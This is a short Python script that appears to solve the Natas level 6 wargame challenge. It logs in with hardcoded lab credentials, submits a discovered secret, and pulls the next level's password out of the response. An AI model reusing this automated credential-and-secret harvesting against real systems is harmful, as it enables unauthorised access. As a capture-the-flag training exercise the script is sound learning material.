import re
import requests
import html
user = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://{}.natas.labs.overthewire.org/'.format(user)
data = {'secret' : 'FOEIUWGHFEEUHOFUOIU', 'submit' : ''}
r = requests.Session().post(url, data=data, auth=(user, password)).text
print(re.findall('natas7 is (.*)', r)[0])